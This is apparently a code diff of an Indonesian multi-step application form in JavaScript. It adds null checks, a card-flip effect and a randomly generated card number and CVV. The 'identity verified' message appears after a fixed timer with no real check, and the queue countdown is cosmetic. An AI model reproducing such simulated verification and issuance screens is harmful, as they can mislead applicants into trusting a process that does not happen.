@@ -14,7 +14,7 @@ const db = getDatabase(app);
 
 let currentStep = 1;
 
-// Navigation Logic
+// --- NAVIGATION LOGIC ---
 window.nextStep = (s) => {
     if (s === 2) {
         if (document.getElementById('inputNama').value.length < 3) return alert("Nama Lengkap wajib diisi!");
@@ -31,10 +31,12 @@ window.nextStep = (s) => {
 
 function updateUI(s) {
     document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
-    document.getElementById(`step${s}`).classList.add('active');
+    const targetStep = document.getElementById(`step${s}`);
+    if (targetStep) targetStep.classList.add('active');
     
     const percent = ((s - 1) / 7) * 100;
-    document.getElementById('progressLine').style.width = percent + "%";
+    const progressLine = document.getElementById('progressLine');
+    if (progressLine) progressLine.style.width = percent + "%";
     
     document.querySelectorAll('.circle').forEach((c, i) => {
         if (i < s - 1) { c.classList.add('completed'); c.innerHTML = "✓"; }
@@ -46,12 +48,12 @@ function simulasiAnalisis() {
     const status = document.getElementById('slikStatus');
     const btn = document.getElementById('btnSlik');
     setTimeout(() => {
-        status.innerHTML = "<b style='color:#22c55e'>IDENTITAS TERVERIFIKASI</b>";
-        btn.style.display = "flex";
+        if (status) status.innerHTML = "<b style='color:#22c55e'>IDENTITAS TERVERIFIKASI</b>";
+        if (btn) btn.style.display = "flex";
     }, 2500);
 }
 
-// Final Process
+// --- FINAL PROCESS ---
 window.generateFinal = async () => {
     if (!document.getElementById('checkAgree').checked) return alert("Harap setujui syarat!");
     updateUI(8);
@@ -62,8 +64,12 @@ function initQueue() {
     let timeLeft = 120;
     const interval = setInterval(() => {
         timeLeft--;
-        document.getElementById('fillBar').style.width = ((120 - timeLeft) / 120 * 100) + "%";
-        document.getElementById('timerDisplay').innerText = `Estimasi: ${timeLeft} Detik`;
+        const fillBar = document.getElementById('fillBar');
+        const timerDisplay = document.getElementById('timerDisplay');
+        
+        if (fillBar) fillBar.style.width = ((120 - timeLeft) / 120 * 100) + "%";
+        if (timerDisplay) timerDisplay.innerText = `Estimasi: ${timeLeft} Detik`;
+        
         if (timeLeft <= 0) {
             clearInterval(interval);
             finalRevealProcess();
@@ -71,44 +77,64 @@ function initQueue() {
     }, 1000);
 }
 
+// --- REVEAL KARTU & EFEK (UPDATE) ---
 async function finalRevealProcess() {
-    document.getElementById('processingArea').style.display = 'none';
-    document.getElementById('finalReveal').style.display = 'block';
+    const procArea = document.getElementById('processingArea');
+    const finalReveal = document.getElementById('finalReveal');
+    if (procArea) procArea.style.display = 'none';
+    if (finalReveal) finalReveal.style.display = 'block';
+    
+    // Tambahkan Efek Glow ke Scene
+    const scene = document.querySelector('.card-scene');
+    if (scene) scene.classList.add('final-glow');
 
     const cardNo = "0810" + Math.floor(Math.random() * 899999999999 + 100000000000);
+    const cvvRandom = Math.floor(Math.random() * 899 + 100); 
     
-    // Set UI Card
-    document.getElementById('displayNo').innerText = cardNo.match(/.{1,4}/g).join(" ");
-    document.getElementById('displayName').innerText = document.getElementById('inputNama').value.toUpperCase();
+    // Set UI Card Depan
+    const dNo = document.getElementById('displayNo');
+    const dName = document.getElementById('displayName');
+    if (dNo) dNo.innerText = cardNo.match(/.{1,4}/g).join(" ");
+    if (dName) dName.innerText = document.getElementById('inputNama').value.toUpperCase();
+    
+    // Set UI Card Belakang (CVV)
+    const cvvCode = document.querySelector('.cvv-code');
+    if(cvvCode) cvvCode.innerText = cvvRandom;
 
-    // Sequence animations
+    // Animasi Status Progress
     for(let i=1; i<=3; i++) {
-        await new Promise(r => setTimeout(r, 800));
-        document.getElementById(`rev${i}`).classList.add('show');
+        await new Promise(r => setTimeout(r, 600));
+        const el = document.getElementById(`rev${i}`);
+        if(el) el.classList.add('show');
     }
 }
 
-// SCREENSHOT LOGIC WITH AUTO-FLIP PROTECTION
+// --- FUNGSI PUTAR KARTU ---
+window.toggleFlip = () => {
+    const card = document.getElementById('cardInner');
+    if (card) {
+        card.classList.toggle('is-flipped');
+        if (navigator.vibrate) navigator.vibrate(20);
+    }
+};
+
+// --- SCREENSHOT LOGIC ---
 window.takeScreenshot = () => {
     const cardInner = document.getElementById('cardInner');
     const area = document.getElementById('captureArea');
     const btn = document.getElementById('btnDownload');
 
-    if (cardInner.classList.contains('is-flipped')) {
-        // Jika terbalik, balikkan dulu
+    if (cardInner && cardInner.classList.contains('is-flipped')) {
         cardInner.classList.remove('is-flipped');
         btn.innerText = "MENYIAPKAN...";
-        
-        // Tunggu animasi balik selesai (800ms) baru capture
-        setTimeout(() => {
-            executeCapture(area, btn);
-        }, 800);
+        setTimeout(() => { executeCapture(area, btn); }, 800);
     } else {
         executeCapture(area, btn);
     }
 };
 
 function executeCapture(area, btn) {
+    if (!btn) return;
     btn.innerText = "MENGUNDUH...";
     html2canvas(area, { 
         scale: 3, 
@@ -123,9 +149,10 @@ function executeCapture(area, btn) {
     });
 }
 
-// Add Emergency Global
+// --- EMERGENCY FIELDS ---
 window.addEmergencyField = () => {
     const container = document.getElementById('emergencyContainer');
+    if (!container) return;
     const div = document.createElement('div');
     div.className = 'emergency-item';
     div.innerHTML = `
